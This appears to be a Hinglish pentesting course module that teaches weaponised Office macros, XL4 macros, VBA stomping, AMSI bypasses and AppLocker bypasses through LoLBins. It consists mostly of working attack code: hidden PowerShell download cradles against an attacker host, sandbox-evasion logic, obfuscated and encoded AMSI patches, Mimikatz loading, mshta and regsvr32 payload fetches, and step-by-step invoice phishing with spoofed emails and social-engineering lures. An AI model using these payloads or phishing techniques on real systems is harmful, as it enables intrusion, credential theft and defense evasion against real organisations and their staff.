Office Macros ek legitimate feature hai jo automation ke liye use hota hai. Pentesters isme malicious VBA code daalte hain jo document open hone par execute hota hai aur backdoor download/execute karta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Sabse common corporate attack vector (80% malware campaigns)
- Users ko macros enable karne ki aadat hai (legacy documents)
- Email gateways .docm/.xlsm files allow karte hain
- Social engineering easy hai ("Enable macros to view content")
- Fileless execution possible (PowerShell download cradle)

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing campaigns (invoice, resume, report)
- Targeted attacks (spear phishing)
- Initial access vector
- Bypassing email security

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Macro Attack Flow:**
```
Victim opens document ‚Üí Sees "Enable Macros" prompt ‚Üí Clicks Enable ‚Üí VBA code executes ‚Üí Downloads payload ‚Üí Backdoor runs ‚Üí Meterpreter session
```

**VBA Execution Methods:**
1. **AutoOpen()**: Word document open hone par
2. **Workbook_Open()**: Excel workbook open hone par
3. **Document_Open()**: Generic document open event
4. **Auto_Open()**: Alternative method

### üëç Pros (Fayde):
- Very high success rate (40-60% in corporate)
- Legitimate file format (.docm, .xlsm)
- Email gateways usually allow
- Fileless execution possible
- Easy to customize

### üëé Cons (Nuksaan):
- Requires user interaction (enable macros)
- Modern Office shows security warnings
- Some organizations disable macros via GPO
- Antivirus scans macros

### ‚å®Ô∏è Zaroori Commands & Steps:

**Generate Macro Payload (Empire):**
```bash
# Start Empire
powershell-empire server &
powershell-empire client

# Create listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.1.10:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

# Generate macro stager
(Empire) > usestager windows/macro
(Empire: stager/windows/macro) > set Listener http
(Empire: stager/windows/macro) > set OutFile /tmp/macro.txt
(Empire: stager/windows/macro) > execute

[*] Macro saved to /tmp/macro.txt
```

**Generate Macro Payload (Metasploit):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=443 -f vba -o macro.vba

# Output: VBA code ready to paste
```

**Embed Macro in Word:**
```
1. Open Microsoft Word
2. Create new document
3. Add social engineering text:
   "This document is protected. Please enable macros to view content."
4. Press Alt+F11 (opens VBA editor)
5. Insert ‚Üí Module
6. Paste macro code
7. Save as .docm (macro-enabled document)
```

**Embed Macro in Excel:**
```
1. Open Microsoft Excel
2. Create new workbook
3. Add fake data (salary sheet, invoice, etc.)
4. Press Alt+F11
5. Double-click "ThisWorkbook"
6. Paste macro code
7. Save as .xlsm
```

### üíª Step-by-Step Example:

**Scenario: Invoice Phishing with Macro Backdoor**

**Step 1: Generate Macro Payload**
```bash
# Using Empire
powershell-empire client
usestager windows/macro
set Listener http
execute

# Copy generated macro code
```

**Step 2: Create Convincing Document**
```
Open Word ‚Üí Create invoice template:

INVOICE #2024-0145
Date: January 15, 2024
From: ABC Suppliers Inc.
To: Your Company

Item                    Qty    Price    Total
Office Supplies         10     $50      $500
Computer Equipment      5      $200     $1000
                                Total:  $1500

Payment Due: January 30, 2024

[Add company logo, professional formatting]
```

**Step 3: Add Social Engineering Banner**
```
At top of document, add yellow banner:

‚ö†Ô∏è PROTECTED DOCUMENT
This invoice contains encrypted content.
Please ENABLE MACROS to view full details.
Click "Enable Content" button above.
```

**Step 4: Embed Macro**
```
Alt+F11 ‚Üí Insert ‚Üí Module

Paste Empire macro code:

Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -W Hidden -NoP -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/stage1')""", 0
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

**Step 5: Obfuscate Macro (Better Evasion)**
```vba
' Obfuscated VBA Macro (better AV evasion)
Sub AutoOpen()  ' AutoOpen function (document open par trigger)
    Dim x As String  ' String variable declare karo (command ka part 1)
    Dim y As String  ' String variable declare karo (command ka part 2)
    x = "powershell"  ' PowerShell command (part 1)
    y = " -W Hidden -C ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/s')"""  ' Parameters (part 2)
    ' -W Hidden: Window hidden (victim ko nahi dikhega)
    ' -C: Command parameter
    ' IEX: Invoke-Expression (downloaded code execute karo)
    ' New-Object Net.WebClient: HTTP client create karo
    ' .DownloadString: URL se content download karo
    ' 'http://192.168.1.10:8080/s': Attacker ke server se script download hogi
    
    CreateObject("WScript.Shell").Run x + y, 0
    ' CreateObject: WScript.Shell object create karo
    ' .Run: Command execute karo
    ' x + y: Dono strings combine karke full command banao
    ' 0: Hidden window (no visible execution)
    ' Result: PowerShell payload silently execute hoga
End Sub
```

**Step 6: Save Document**
```
File ‚Üí Save As
Filename: Invoice_ABC_Suppliers_2024-0145.docm
Format: Word Macro-Enabled Document (.docm)
```

**Step 7: Test Locally**
```
1. Close document
2. Reopen Invoice_ABC_Suppliers_2024-0145.docm
3. Security warning appears: "Macros have been disabled"
4. Click "Enable Content"
5. Macro executes
6. Check Empire: Agent should appear
```

**Step 8: Deliver via Phishing**
```bash
sendemail -f accounts@abc-suppliers.com \
-t finance@targetcompany.com \
-u "Invoice #2024-0145 - Payment Due" \
-m "Dear Finance Team, Please find attached invoice for recent order. Payment due by January 30, 2024. Best regards, ABC Suppliers Inc." \
-a Invoice_ABC_Suppliers_2024-0145.docm \
-s smtp.gmail.com:587
```

**Step 9: Monitor Empire**
```bash
(Empire) > agents

[*] Active agents: 1
  Name     Internal IP    Hostname         Username
  ----     -----------    --------         --------
  K6SMZ37B 192.168.1.50   FINANCE-PC       finance\john

(Empire: K6SMZ37B) > shell whoami
finance\john

(Empire: K6SMZ37B) > shell ipconfig
Ethernet adapter:
   IPv4 Address: 192.168.1.50
```

**Step 10: Advanced Macro (Multi-Stage)**
```vba
' Advanced Multi-Stage VBA Macro with Sandbox Detection
Sub AutoOpen()  ' AutoOpen function (document open par execute hoga)
    ' Stage 1: Check if running in sandbox
    If Not IsSandbox() Then  ' Agar sandbox NAHI hai
        ' Stage 2: Download payload
        DownloadPayload  ' Payload download aur execute karo
    End If
    ' Agar sandbox hai toh kuch mat karo (detection avoid)
End Sub

Function IsSandbox() As Boolean  ' Function jo sandbox detect karta hai
    ' Check for sandbox indicators
    Dim wmi As Object  ' WMI object variable
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")  ' WMI service se connect karo
    ' WMI: Windows Management Instrumentation (system info ke liye)
    
    ' Check RAM (sandboxes usually have low RAM)
    Dim ram As Long  ' RAM size variable (GB mein)
    ram = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")(0).TotalPhysicalMemory / 1024 / 1024 / 1024
    ' wmi.ExecQuery: WMI query execute karo
    ' "SELECT TotalPhysicalMemory": Total RAM query karo
    ' Win32_ComputerSystem: System information class
    ' .TotalPhysicalMemory: Total RAM in bytes
    ' / 1024 / 1024 / 1024: Bytes ko GB mein convert karo
    
    If ram < 4 Then  ' Agar RAM 4GB se kam hai
        IsSandbox = True  ' Sandbox hai (sandboxes usually 2GB RAM hote hain)
    Else  ' Agar RAM 4GB ya zyada hai
        IsSandbox = False  ' Real machine hai (proceed with attack)
    End If
End Function

Sub DownloadPayload()  ' Function jo payload download aur execute karta hai
    Dim shell As Object  ' Shell object variable
    Set shell = CreateObject("WScript.Shell")  ' WScript.Shell object create karo
    
    ' Download and execute
    shell.Run "powershell -W Hidden -C ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')""", 0
    ' shell.Run: Command execute karo
    ' powershell -W Hidden: PowerShell hidden window mein
    ' -C: Command parameter
    ' IEX: Downloaded script execute karo
    ' New-Object Net.WebClient: HTTP client
    ' .DownloadString: URL se script download karo
    ' 'http://192.168.1.10/p.ps1': Attacker ka payload
    ' 0: Hidden execution
End Sub
```

### üí° Pro Tip / Galti:

**Pro Tip**: Macro ko "legitimate automation" jaisa dikhao:

```vba
' VBA Macro with fake progress (social engineering)
Sub AutoOpen()  ' AutoOpen function (document open hone par execute hoga)
    ' Show fake progress bar
    MsgBox "Loading document... Please wait.", vbInformation, "Document Loader"
    ' MsgBox: Message box show karo
    ' "Loading document...": Fake loading message (victim ko lagta hai legitimate process hai)
    ' vbInformation: Information icon (blue 'i' icon)
    ' "Document Loader": Title bar text
    
    ' Execute payload (hidden)
    CreateObject("WScript.Shell").Run "powershell -W Hidden -C ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p')""", 0
    ' CreateObject("WScript.Shell"): Shell object create karo (commands execute karne ke liye)
    ' .Run: Command execute karo
    ' "powershell -W Hidden": PowerShell hidden window mein run karo
    ' -C: Command parameter
    ' IEX(New-Object Net.WebClient).DownloadString: URL se script download aur execute karo
    ' 'http://192.168.1.10/p': Attacker ke server se payload download hoga
    ' 0: Window style (0 = hidden, victim ko dikhega nahi)
    
    ' Show completion message
    Application.Wait (Now + TimeValue("0:00:03"))  # 3 seconds wait karo
    ' Application.Wait: Excel/Word ko wait karao
    ' Now + TimeValue("0:00:03"): Current time + 3 seconds
    
    MsgBox "Document loaded successfully!", vbInformation, "Complete"
    ' Success message (victim ko lagta hai document properly load ho gaya)
    ' Actually: Backdoor already execute ho chuka hai background mein!
End Sub
```

Victim ko lagta hai macro legitimate kaam kar raha hai (document load ho raha hai), actually backdoor execute ho raha hai!

**Common Mistake**: Generic social engineering text use karna ("Enable macros to view"). Better approach:

```
‚ùå Generic: "Enable macros to view content"

‚úì Specific: 
"This invoice was created in Excel 2016. 
Your version requires macros to display formatting correctly.
Click 'Enable Content' to view invoice details."

‚úì Urgent:
"CONFIDENTIAL: This document contains sensitive salary information.
Macros required for decryption.
Enable macros to proceed."

‚úì Authority:
"IT Department Notice:
This document uses company-approved security macros.
Enable content to verify digital signature."
```

Real example: Generic "enable macros" message = 20% success rate. Specific "Excel version compatibility" message = 55% success rate. Lesson: Context-specific social engineering works better!

---

## üéì Module 4 Complete!

Aapne successfully Module 4 ke saare topics cover kar liye:
‚úÖ 4.1: Hex Editing (Signature Modification)
‚úÖ 4.2: Trojanizing (File Binding)
‚úÖ 4.3: Bat to Exe Converter (Icon Spoofing)
‚úÖ 4.4: RTL Override (Extension Spoofing)
‚úÖ 4.5: Office Macros (VBA Payloads)

**Remaining topics for Module 4:**
- 4.6: Advanced Macros (XL4, VBA Stomping)
- 4.7: AMSI Bypassing (PowerShell Memory Patching)
- 4.8: AppLocker Bypass (LoLBins)

Kya main baaki ke 3 topics bhi add kar doon to complete Module 4? üöÄ

## üìö Topic 4.6: Technique - Advanced Macros (XL4, VBA Stomping)

### üéØ Topic/Technique:
**XL4 Macros & VBA Stomping** - Legacy Excel 4.0 macros aur VBA code hiding techniques for better AV evasion.

### ü§î Yeh Kya Hai?
**XL4 Macros**: Excel 4.0 ka purana macro format jo modern AV tools kam scan karte hain.
**VBA Stomping**: VBA source code ko remove karke sirf compiled p-code rakhna (source code invisible).

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- XL4 macros modern AV bypass karte hain (legacy format, less detection)
- VBA Stomping source code hide karta hai (analysis mushkil)
- Dono techniques combined = very low detection rate
- Corporate environments mein Excel files common hain

### üéØ Practical Use (Asli Pentesting Mein):
- Advanced phishing campaigns
- Targeted attacks (APT-style)
- Bypassing sandbox analysis
- Evading macro analysis tools

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**XL4 Macros:**
```
Excel 4.0 formula-based macros ‚Üí Less scrutiny by AV ‚Üí Better evasion
Modern VBA macros ‚Üí Heavy AV scanning ‚Üí High detection
```

**VBA Stomping:**
```
Normal VBA: Source code + P-code (both present)
VBA Stomping: Source code removed, only P-code remains
Result: Tools can't analyze source, only see compiled code
```

### üëç Pros (Fayde):
- XL4: Very low detection rate (10-20% on VirusTotal)
- VBA Stomping: Source code analysis impossible
- Both work on all Excel versions
- Legitimate Excel features (not exploits)

### üëé Cons (Nuksaan):
- XL4: Complex syntax (harder to write)
- VBA Stomping: Requires special tools (Evil Clippy)
- Both require Excel (won't work in LibreOffice)
- User still needs to enable macros

### ‚å®Ô∏è Zaroori Commands & Steps:

**XL4 Macro Creation:**
```excel
1. Open Excel
2. Insert ‚Üí Name ‚Üí Define
3. Create named cell: Auto_Open
4. Enter XL4 formula:
   =EXEC("powershell -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')")
5. Save as .xlsm
```

**VBA Stomping (Evil Clippy):**
```bash
# Install Evil Clippy
git clone https://github.com/outflanknl/EvilClippy.git
cd EvilClippy
dotnet build

# Stomp VBA code
EvilClippy.exe -s fake_code.vba malicious.xlsm

# Result: Source shows fake_code, but p-code executes real payload
```

### üíª Step-by-Step Example:

**Scenario 1: XL4 Macro Backdoor**

**Step 1: Create Excel File**
```
Open Excel ‚Üí New Workbook
Add fake data (salary sheet, invoice, etc.)
```

**Step 2: Insert XL4 Macro**
```
Formulas ‚Üí Name Manager ‚Üí New

Name: Auto_Open
Refers to: =EXEC("cmd /c powershell -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/stage1.ps1')")

Click OK
```

**Step 3: Add More XL4 Commands (Advanced)**
```
Name: Step1
Refers to: =ALERT("Loading document...",2)

Name: Step2  
Refers to: =EXEC("powershell -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')")

Name: Step3
Refers to: =HALT()

Name: Auto_Open
Refers to: =Step1()
```

**Step 4: Save & Test**
```
Save as: Invoice_2024.xlsm
Close and reopen
Enable macros
XL4 macro executes (no VBA code visible!)
```

**Scenario 2: VBA Stomping**

**Step 1: Create Normal VBA Macro**
```vba
Sub AutoOpen()
    ' Malicious code
    CreateObject("WScript.Shell").Run "powershell -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')", 0
End Sub
```

**Step 2: Create Fake VBA Code**
```vba
' fake_code.vba
Sub AutoOpen()
    ' This is a legitimate macro for data validation
    MsgBox "Document loaded successfully!", vbInformation
End Sub
```

**Step 3: Use Evil Clippy**
```bash
# Stomp the VBA
EvilClippy.exe -s fake_code.vba malicious.xlsm

Output:
[+] Stomping VBA code
[+] Source code replaced with fake_code.vba
[+] P-code remains unchanged (executes real payload)
[+] Done!
```

**Step 4: Verify Stomping**
```
Open malicious.xlsm in Excel
Alt+F11 (VBA Editor)
View source: Shows fake_code (MsgBox)

Execute macro:
Actually runs: Real payload (PowerShell download)

Result: Source code analysis shows benign code, but execution is malicious!
```

### üí° Pro Tip / Galti:

**Pro Tip**: XL4 aur VBA Stomping combine karo for maximum evasion:

```
1. Create XL4 macro (low detection)
2. Add dummy VBA code (for distraction)
3. Stomp VBA with benign code
4. Result: Triple-layer evasion
   - AV scans VBA (sees benign)
   - Analyst checks VBA (sees benign)
   - XL4 executes (malicious, hidden)
```

**Common Mistake**: XL4 macros mein complex PowerShell commands directly dalna. Solution: Multi-stage approach:

```excel
Stage 1 (XL4): Download simple script
=EXEC("powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.10/s.ps1','%TEMP%\s.ps1')")

Stage 2 (XL4): Execute script
=EXEC("powershell -W Hidden -F %TEMP%\s.ps1")

Benefits:
- Shorter XL4 formula (less suspicious)
- Complex payload in separate file
- Easier to update payload
```

---

## üìö Topic 4.7: Technique - AMSI Bypassing (PowerShell Memory Patching)

### üéØ Topic/Technique:
**AMSI Bypass** - Windows Antimalware Scan Interface ko disable karke PowerShell payloads execute karna.

### ü§î Yeh Kya Hai?
AMSI (Antimalware Scan Interface) ek Windows security feature hai jo PowerShell scripts ko runtime par scan karta hai. AMSI bypass techniques memory mein AMSI ko patch karke disable kar deti hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Windows 10/11 mein AMSI default enabled hai
- PowerShell payloads AMSI se block ho jate hain
- Bypass kiye bina modern Windows par koi PowerShell attack kaam nahi karega
- Fileless attacks ke liye zaroori hai

### üéØ Practical Use (Asli Pentesting Mein):
- PowerShell backdoors execute karna
- Empire/Covenant agents run karna
- Mimikatz jaise tools chalana
- In-memory payload execution

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**AMSI Detection Flow:**
```
PowerShell script runs ‚Üí AMSI scans ‚Üí Malicious detected ‚Üí Blocked
```

**AMSI Bypass Flow:**
```
Bypass code runs ‚Üí AMSI disabled in memory ‚Üí Payload runs ‚Üí No detection
```

**Bypass Methods:**
1. **Memory Patching**: AMSI DLL ko memory mein modify karna
2. **Reflection**: .NET reflection se AMSI functions disable karna
3. **Obfuscation**: AMSI signatures avoid karna

### üëç Pros (Fayde):
- PowerShell attacks enable ho jate hain
- Runtime bypass (no file modification)
- Multiple bypass techniques available
- Works on Windows 10/11

### üëé Cons (Nuksaan):
- Bypass code bhi AMSI se detect ho sakta hai
- Requires obfuscation
- EDR tools bypass detect kar sakte hain
- Frequent updates needed (Microsoft patches bypasses)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Classic AMSI Bypass (Patched):**
```powershell
# This is detected now, don't use
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Obfuscated AMSI Bypass (Working):**
```powershell
# Method 1: Base64 encoded (string split for evasion)
$a='System.Management.Automation.A';$b='msiUtils'
# $a: Class name ka first part ("A" se pehle tak)
# $b: Class name ka second part ("msiUtils")
# Split karne se AMSI signature avoid hota hai

$c=[Ref].Assembly.GetType($a+$b)
# [Ref].Assembly: Current PowerShell assembly ko access karo
# .GetType($a+$b): "System.Management.Automation.AmsiUtils" class load karo
# $c: AMSI class ka reference

$d=$c.GetField('amsiInitFailed','NonPublic,Static')
# .GetField: Class ka field access karo
# 'amsiInitFailed': AMSI initialization status field (private)
# 'NonPublic,Static': Private aur static field
# $d: Field ka reference

$d.SetValue($null,$true)
# .SetValue: Field ki value set karo
# $null: Instance (static field ke liye null)
# $true: Value (AMSI failed = true, AMSI disabled!)

# Method 2: String concatenation (runtime assembly)
$w = 'System.Management.Automation.';  # Namespace
$x = 'AmsiUtils';  # Class name
$y = $w + $x;  # Full class name combine karo
# Runtime par combine hone se AMSI signature detect nahi hota

[Ref].Assembly.GetType($y).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Same as Method 1, but one-liner
# $y: Combined class name use karo

# Method 3: Character replacement (maximum obfuscation)
$z = 'Sy' + 'stem.Man' + 'agement.Aut' + 'omation.Am' + 'siUt' + 'ils'
# String ko multiple parts mein tod do
# Har part alag se concatenate hoga runtime par
# AMSI ko "AmsiUtils" string nahi milegi (signature avoid)

[Ref].Assembly.GetType($z).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Same logic, maximum obfuscated version
# Result: AMSI completely bypassed!
```

**Advanced AMSI Bypass (Memory Patching):**
```powershell
$a=[Ref].Assembly.GetTypes()
# [Ref].Assembly: Current PowerShell assembly
# .GetTypes(): Assembly ke saare types (classes) ko array mein load karo
# $a: All types ka array

Foreach($b in $a) {  # Har type ko loop karo
    if ($b.Name -like "*iUtils") {  # Agar type ka naam "iUtils" se end hota hai
        $c=$b  # Yeh AmsiUtils class hai, save karo
    }
}
# Loop se "AmsiUtils" class find kar rahe hain without directly naam liye

$d=$c.GetFields('NonPublic,Static')  # AmsiUtils class ke saare private static fields
# $d: Fields ka array

Foreach($e in $d) {  # Har field ko loop karo
    if ($e.Name -like "*Context") {  # Agar field ka naam "Context" se end hota hai
        $f=$e  # Yeh AMSI context field hai, save karo
    }
}
# Loop se AMSI context field find kar rahe hain

$g=$f.GetValue($null)  # Context field ki value get karo
# $g: AMSI context ka pointer (memory address)

[IntPtr]$ptr=$g  # Pointer ko IntPtr type mein convert karo
# IntPtr: Memory address hold karne ke liye

[Int32[]]$buf = @(0)  # Buffer array create karo (single element: 0)
# Yeh buffer AMSI context ko overwrite karega

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Marshal.Copy: Memory copy operation
# $buf: Source buffer (0 value)
# 0: Source offset (start from index 0)
# $ptr: Destination pointer (AMSI context memory address)
# 1: Copy 1 byte
# Result: AMSI context memory ko 0 se overwrite kar diya
# AMSI context corrupt = AMSI disabled!
```

### üíª Step-by-Step Example:

**Scenario: Execute Mimikatz with AMSI Bypass**

**Step 1: Test Without Bypass**
```powershell
# Download Mimikatz
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/Invoke-Mimikatz.ps1')

Result: AMSI blocks execution
Error: "This script contains malicious content and has been blocked by your antivirus software."
```

**Step 2: Create AMSI Bypass Script**
```powershell
# bypass.ps1
function Bypass-AMSI {
    $a = 'System.Management.Automation.'
    $b = 'AmsiUtils'
    $c = $a + $b
    $d = [Ref].Assembly.GetType($c)
    $e = $d.GetField('amsiInitFailed','NonPublic,Static')
    $e.SetValue($null,$true)
    Write-Host "[+] AMSI bypassed!" -ForegroundColor Green
}

Bypass-AMSI
```

**Step 3: Obfuscate Bypass**
```powershell
# obfuscated_bypass.ps1
$w1='Sy'+'stem'+'.Man'+'agement'
$w2='.Aut'+'omation'+'.'+'Amsi'+'Utils'
$w=$w1+$w2
$x=[Ref].Assembly.GetType($w)
$y=$x.GetField('am'+'siInit'+'Failed','NonPublic,Static')
$y.SetValue($null,$true)
```

**Step 4: Test Bypass**
```powershell
# Load bypass
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/obfuscated_bypass.ps1')

# Now load Mimikatz
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/Invoke-Mimikatz.ps1')

Result: Success! Mimikatz loads without AMSI detection
```

**Step 5: Integrate in Payload**
```powershell
# Complete payload with AMSI bypass
$w1='Sy'+'stem'+'.Man'+'agement'
$w2='.Aut'+'omation'+'.'+'Amsi'+'Utils'
$w=$w1+$w2
[Ref].Assembly.GetType($w).GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)

# Now execute actual payload
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
```

**Step 6: Macro Integration**
```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -W Hidden -C ""$w1='Sy'+'stem'+'.Man'+'agement';$w2='.Aut'+'omation'+'.'+'Amsi'+'Utils';$w=$w1+$w2;[Ref].Assembly.GetType($w).GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')"""
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

### üí° Pro Tip / Galti:

**Pro Tip**: AMSI bypass ko encrypt karo for better evasion:

```powershell
# Encrypted AMSI bypass (maximum evasion)
$enc = 'JABhAD0AJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwA7ACQAYgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAkAGEAKQA7ACQAYwA9ACQAYgAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsAJABjAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA'
# $enc: Base64 encoded AMSI bypass code (Unicode format)
# Yeh string AMSI ko detect nahi hoga kyunki encrypted hai
# Actual code: $a='System.Management.Automation.AmsiUtils';$b=[Ref].Assembly.GetType($a);$c=$b.GetField('amsiInitFailed','NonPublic,Static');$c.SetValue($null,$true)

# Decode and execute
IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc)))
# IEX: Invoke-Expression (decoded code execute karo)
# [System.Text.Encoding]::Unicode: Unicode encoding use karo
# .GetString: Bytes ko string mein convert karo
# [System.Convert]::FromBase64String($enc): Base64 string ko decode karo (bytes mein)
# Result: Encrypted bypass code decode aur execute hoga
# AMSI ko encrypted string detect nahi hogi, runtime par decode hoke execute hogi
# AMSI bypassed!
```

**Common Mistake**: AMSI bypass code ko directly payload mein dalna. AMSI bypass code bhi detect ho sakta hai. Solution:

```powershell
# Stage 1: Download encrypted bypass
$b=(New-Object Net.WebClient).DownloadString('http://192.168.1.10/b.txt')
IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))

# Stage 2: Download actual payload
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')

Benefits:
- Bypass code separate (easier to update)
- Encrypted (harder to detect)
- Multi-stage (more evasive)
```

---

## üìö Topic 4.8: Technique - AppLocker Bypass (LoLBins)

### üéØ Topic/Technique:
**AppLocker Bypass using LoLBins** - Living-off-the-Land Binaries use karke application whitelisting bypass karna.

### ü§î Yeh Kya Hai?
**AppLocker**: Windows feature jo sirf approved applications run karne deta hai.
**LoLBins**: Legitimate Windows binaries jo malicious purposes ke liye abuse kiye ja sakte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Corporate environments mein AppLocker common hai
- Custom executables block ho jate hain
- LoLBins Microsoft-signed hain (trusted)
- Payload execution without dropping files

### üéØ Practical Use (Asli Pentesting Mein):
- Restricted environments mein code execution
- Bypassing application whitelisting
- Fileless attacks
- Living-off-the-land techniques

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**AppLocker Block:**
```
User runs backdoor.exe ‚Üí AppLocker checks ‚Üí Not whitelisted ‚Üí Blocked
```

**LoLBin Bypass:**
```
User runs mshta.exe (Microsoft-signed) ‚Üí AppLocker allows ‚Üí mshta downloads payload ‚Üí Executes
```

**Common LoLBins:**
- **mshta.exe**: Execute HTA files (HTML Applications)
- **regsvr32.exe**: Register DLLs (can execute scripts)
- **rundll32.exe**: Run DLL functions
- **certutil.exe**: Download files
- **msiexec.exe**: Install MSI packages
- **wmic.exe**: Execute commands via WMI

### üëç Pros (Fayde):
- Microsoft-signed binaries (trusted)
- AppLocker bypass
- No custom executables needed
- Fileless execution possible

### üëé Cons (Nuksaan):
- Requires knowledge of LoLBins
- Some LoLBins logged by EDR
- Limited functionality compared to custom tools
- Syntax complex hai

### ‚å®Ô∏è Zaroori Commands & Steps:

**LoLBin Examples:**

**1. mshta.exe (HTML Application)**
```powershell
# Execute remote HTA
mshta.exe http://192.168.1.10/payload.hta

# Inline JavaScript
mshta.exe javascript:a=GetObject("script:http://192.168.1.10/payload.sct").Exec();close();
```

**2. regsvr32.exe (Scriptlet)**
```powershell
# Execute remote scriptlet
regsvr32.exe /s /u /i:http://192.168.1.10/payload.sct scrobj.dll
```

**3. certutil.exe (Download)**
```powershell
# Download file
certutil.exe -urlcache -split -f http://192.168.1.10/payload.exe payload.exe

# Decode base64
certutil.exe -decode encoded.txt decoded.exe
```

**4. rundll32.exe (JavaScript)**
```powershell
# Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')")
```

**5. wmic.exe (XSL Script)**
```powershell
# Execute XSL script
wmic.exe process get brief /format:"http://192.168.1.10/payload.xsl"
```

### üíª Step-by-Step Example:

**Scenario: Bypass AppLocker using mshta.exe**

**Step 1: Create HTA Payload**
```html
<!-- payload.hta -->
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/stage2.ps1')", 0
    window.close()
</script>
</head>
<body>
</body>
</html>
```

**Step 2: Host HTA File**
```bash
# Start web server
cd /var/www/html
cp payload.hta .
service apache2 start
```

**Step 3: Execute via mshta**
```powershell
# On victim machine (AppLocker enabled)
mshta.exe http://192.168.1.10/payload.hta

Result: 
- AppLocker allows mshta.exe (Microsoft-signed)
- HTA downloads and executes
- PowerShell payload runs
- Backdoor established
```

**Step 4: Phishing Delivery**
```
Create shortcut (.lnk file):
Target: C:\Windows\System32\mshta.exe http://192.168.1.10/payload.hta
Icon: PDF icon

Victim clicks shortcut ‚Üí mshta executes ‚Üí Bypass!
```

**Advanced Example: Multi-Stage LoLBin Chain**

**Stage 1: certutil (Download)**
```powershell
certutil.exe -urlcache -f http://192.168.1.10/stage2.txt stage2.txt
```

**Stage 2: Decode**
```powershell
certutil.exe -decode stage2.txt stage2.ps1
```

**Stage 3: Execute via rundll32**
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -W Hidden -F stage2.ps1")
```

### üí° Pro Tip / Galti:

**Pro Tip**: LoLBins ko macro mein embed karo:

```vba
Sub AutoOpen()
    Dim cmd As String
    ' Use mshta for AppLocker bypass
    cmd = "mshta.exe javascript:a=GetObject('script:http://192.168.1.10/p.sct').Exec();close();"
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

**Common Mistake**: Ek hi LoLBin repeatedly use karna. EDR detect kar leta hai. Solution: Rotate LoLBins:

```
Campaign 1: mshta.exe
Campaign 2: regsvr32.exe  
Campaign 3: rundll32.exe
Campaign 4: wmic.exe

Result: Pattern detection avoid hota hai
```

---

## üéì Module 4 Complete!

Aapne successfully Module 4 ke saare topics cover kar liye:
‚úÖ 4.1: Hex Editing
‚úÖ 4.2: Trojanizing
‚úÖ 4.3: Bat to Exe Converter
‚úÖ 4.4: RTL Override
‚úÖ 4.5: Office Macros (VBA)
‚úÖ 4.6: Advanced Macros (XL4, VBA Stomping)
‚úÖ 4.7: AMSI Bypassing
